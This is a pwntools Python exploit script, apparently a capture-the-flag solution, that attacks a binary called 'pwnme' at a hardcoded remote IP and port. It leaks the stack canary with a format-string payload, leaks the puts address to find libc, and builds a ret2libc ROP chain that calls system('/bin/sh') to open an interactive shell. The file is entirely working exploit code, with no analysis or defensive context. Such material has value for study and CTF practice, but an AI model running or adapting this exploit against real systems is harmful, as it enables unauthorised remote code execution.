#!/usr/bin/python3

from pwn import *

libc = ELF('./libc6_2.23-0ubuntu11.3_amd64.so', checksec=False)
context.binary = exe = ELF('./pwnme', checksec=False)
context.log_level = 'critical'

# p = process('./pwnme_patched')
p = remote('139.180.134.15', 7333)

############################
### Stage 1: Leak canary ###
############################
p.sendlineafter(b'name?', b'%p'*16)
p.recvline()
canary = int(p.recvuntil(b"What", drop=True).split(b'0x')[-1], 16)
log.info("Canary: " + hex(canary))

##########################################
### Stage 2.1: Ret2libc - Leak address ###
##########################################
pop_rdi = 0x00000000004013a3
pop_rsi_r15 = 0x00000000004013a1

payload = b'A'*0x48 + p64(canary) + b'B'*8
payload += flat(
    pop_rdi,
    exe.got['puts'],
    exe.plt['puts'],
    exe.sym['main'])
p.sendlineafter(b'event:', payload)
p.recvline()
p.recvline()
puts_addr = u64(p.recvline()[:-1] + b'\x00\x00')
log.info("Puts address: " + hex(puts_addr))
libc.address = puts_addr - libc.sym['puts']
log.info("Libc base: " + hex(libc.address))

#######################################
### Stage 2.2: Ret2libc - Get shell ###
#######################################
p.sendlineafter(b'name?', b'AAAA')
payload = b'A'*0x48 + p64(canary) + b'B'*8
payload += flat(
    pop_rsi_r15,
    0,
    0,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym['system'])
p.sendlineafter(b'event:', payload)

p.interactive()